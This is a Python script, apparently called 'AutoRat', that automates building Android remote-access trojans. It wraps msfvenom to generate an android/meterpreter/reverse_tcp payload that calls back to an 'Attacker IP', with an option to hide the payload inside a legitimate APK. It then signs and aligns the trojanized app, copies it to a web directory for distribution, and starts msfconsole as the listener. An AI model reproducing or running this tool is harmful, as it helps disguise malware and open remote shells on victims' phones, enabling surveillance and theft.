import os
from subprocess import run

os.chdir(os.getcwd())
path = str(os.getcwd())
name = ""


def banner():
    print("""
    ___         __        ____        __ 
   /   | __  __/ /_____  / __ \____ _/ /_
  / /| |/ / / / __/ __ \/ /_/ / __ `/ __/
 / ___ / /_/ / /_/ /_/ / _, _/ /_/ / /_  
/_/  |_\__,_/\__/\____/_/ |_|\__,_/\__/ 
          """)


def options(opt):
    if opt == 'main':
        print("Commands")
        print("generate" " --> " "Generate Payload")
        print("sign" " --> " "sign payload generated")
        print("listener" " --> " "payload Listener")
        print("help" " --> " "Shows this option")
    else:
        print("plane" " --> " "Plane Signing")
        print("hide" " --> " "Hides within another original APK")


def main():
    banner()
    try:
        while True:
            opt = str(input("Enter Option >> "))
            if opt == 'generate':
                opt2 = str(input("Enter type of generation: "))
                if opt2 == 'plane':
                    name = str(input("Enter name [name with .apk] >> "))
                    lhost = str(input("Enter Attacker IP >> "))
                    lport = str(input("Enter Available Port >> "))
                    cmd = "msfvenom -p android/meterpreter/reverse_tcp LHOST={a} LPORT={b} R > {c}/payload_files/{d}".format(
                        a=lhost, b=lport, c=path, d=name)
                    run(cmd, shell=True)
                elif opt2 == 'hide':
                    name = str(input("Enter name [name with .apk] >> "))
                    original = str(
                        input("Enter Original filename [name with .apk] >> "))
                    lhost = str(input("Enter Attacker IP >> "))
                    lport = str(input("Enter Available Port >> "))
                    cmd = "msfvenom -x {c}/original/{e} -p android/meterpreter/reverse_tcp LHOST={a} LPORT={b} R > {c}/payload_files/{d}".format(
                        a=lhost, b=lport, c=path, d=name, e=original)
                    run(cmd, shell=True)
                elif opt2 == 'help':
                    options('help')
                else:
                    print('Wrong option')
            elif opt == 'sign':
                name2 = str(input("Enter Output Name >> "))
                cmd = "keytool -genkey -v -keystore {}/payload_files/key.jks -keyalg RSA -keysize 2048 -validity 10000 -alias my-alias".format(
                    path)
                run(cmd, shell=True)
                os.chdir('{}/payload_files'.format(path))
                cmd2 = "zipalign -v 4 {a} {b}/signed_files/{c}".format(
                    a=name, b=path, c=name2)
                cmd3 = "cp {b}/signed_files/{c} /var/www/apk/".format(
                    b=path, c=name2)
                run(cmd2, shell=True)
                run(cmd3, shell=True)
            elif opt == 'listener':
                run("msfconsole", shell=True)
            elif opt == 'help':
                options('main')
            else:
                print("Error")
    except KeyboardInterrupt:
        print("Quiting")


if __name__ == '__main__':
    main()
